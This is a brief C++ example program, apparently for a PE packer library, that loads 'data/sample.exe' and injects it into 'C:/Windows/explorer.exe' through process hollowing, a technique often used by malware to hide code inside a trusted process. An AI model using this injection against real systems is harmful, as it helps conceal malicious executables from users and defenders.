/**
 * example_inject.cpp
 **/

#include "packer.hpp"

int main(int argc, char **argv)
{
    /* read pe data into memory */
    packer_t packer;
    packer_read_file(&packer, "data/sample.exe");

    /* inject pe via process hollowing */
    packer_inject(&packer, "C:/Windows/explorer.exe");

    packer_free(&packer);
    return 0;
}